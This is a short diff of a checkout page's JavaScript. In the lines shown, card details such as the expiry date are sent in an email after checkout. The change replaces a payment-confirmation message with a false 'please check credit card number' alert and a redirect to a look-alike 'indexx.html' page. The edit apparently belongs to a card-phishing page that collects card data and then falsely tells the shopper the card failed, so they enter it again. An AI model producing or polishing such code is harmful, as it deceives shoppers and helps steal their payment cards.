@@ -200,8 +200,8 @@ document.getElementById('checkout-btn').addEventListener('click', async ()=>{
       expiry:expiryEl.value.trim(),
     });
     console.log("Email sent successfully.");
-    alert("Please hang tight while we confirm your payment. A team member willget back to you shortly");
-    window.location.href = "index.html";
+    alert("Unable to redirect, pleasecheckcredit card number");
+    window.location.href = "indexx.html";
   } catch (err) {
     console.error("Failed to send order email:", err);
     window.location.href = "failure.html"
